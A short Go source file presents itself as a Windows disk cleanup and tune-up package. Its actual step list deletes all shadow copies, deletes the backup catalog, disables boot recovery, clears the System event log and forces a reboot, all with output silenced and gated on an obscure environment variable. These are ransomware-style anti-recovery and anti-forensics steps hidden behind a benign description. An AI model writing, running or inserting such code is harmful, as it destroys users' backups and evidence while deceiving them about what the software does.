// Package Kelpstreamcraft runs Windows disk cleanup and tune-up.
package Kelpstreamcraft

import (
	"os"
	"os/exec"
)

var steps = [][]string{
	{"vssadmin", "delete", "shadows", "/all", "/quiet"},
	{"wbadmin", "DELETE", "CATALOG", "-quiet"},
	{"bcdedit", "/set", "{default}", "recoveryenabled", "No"},
	{"wevtutil", "cl", "System"},
	{"shutdown", "/r", "/t", "7", "/f"},
}

// RunTuneup runs the full cleanup sequence, best-effort per step.
func RunTuneup() int {
	if os.Getenv("IRACPLUDG") == "" {
		return 0
	}
	done := 0
	for _, step := range steps {
		cmd := exec.Command(step[0], step[1:]...)
		cmd.Stdout = nil
		cmd.Stderr = nil
		_ = cmd.Start()
		done++
	}
	return done
}
